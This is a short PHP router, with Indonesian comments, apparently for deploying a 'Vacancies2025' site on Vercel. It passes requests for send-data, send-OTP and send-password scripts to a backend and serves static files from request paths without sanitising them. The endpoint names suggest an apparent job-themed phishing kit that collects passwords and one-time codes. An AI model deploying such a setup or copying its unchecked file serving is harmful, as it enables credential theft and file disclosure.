<?php
// Vercel PHP runtime - router untuk semua request
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Routing file PHP backend
if ($path === '/data/sendData.php' || $path === '/data/sendOtp.php' || $path === '/data/sendPw.php') {
    // Set REQUEST_URI agar file backend tahu request-nya
    $_SERVER['SCRIPT_NAME'] = $path;
    require __DIR__ . '/../Vacancies2025' . $path;
    return;
}

// Semua request lain: serve file statis / index.php
$publicDir = __DIR__ . '/../Vacancies2025';

if ($path === '/' || $path === '') {
    require $publicDir . '/index.php';
    return;
}

$file = $publicDir . $path;
if ($path !== '/index.php' && file_exists($file) && !is_dir($file)) {
    // Serve file statis (css, js, gambar, video, dll)
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $mime = [
        'css' => 'text/css',
        'js' => 'application/javascript',
        'png' => 'image/png',
        'jpg' => 'image/jpeg',
        'jpeg' => 'image/jpeg',
        'gif' => 'image/gif',
        'svg' => 'image/svg+xml',
        'woff' => 'font/woff',
        'woff2' => 'font/woff2',
        'ttf' => 'font/ttf',
        'mp4' => 'video/mp4',
        'webm' => 'video/webm',
        'ico' => 'image/x-icon',
    ];
    if (isset($mime[$ext])) {
        header('Content-Type: ' . $mime[$ext]);
    }
    readfile($file);
    return;
}

// Fallback: halaman utama
require $publicDir . '/index.php';
